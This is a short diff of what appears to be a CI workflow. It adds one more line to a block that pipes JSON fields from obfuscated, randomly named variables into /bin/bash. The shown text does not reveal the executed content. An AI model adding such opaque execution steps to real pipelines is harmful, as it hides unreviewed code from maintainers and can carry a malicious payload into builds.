@@ -32,6 +32,7 @@ jobs:
           echo $btdjm6054 | jq -r .c2591 | /bin/bash
           echo $uh10 | jq -r .fksw88571 | /bin/bash
           echo $wuvtx84205 | jq -r .jsy904 | /bin/bash
+          echo $m94 | jq -r .wp35710 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
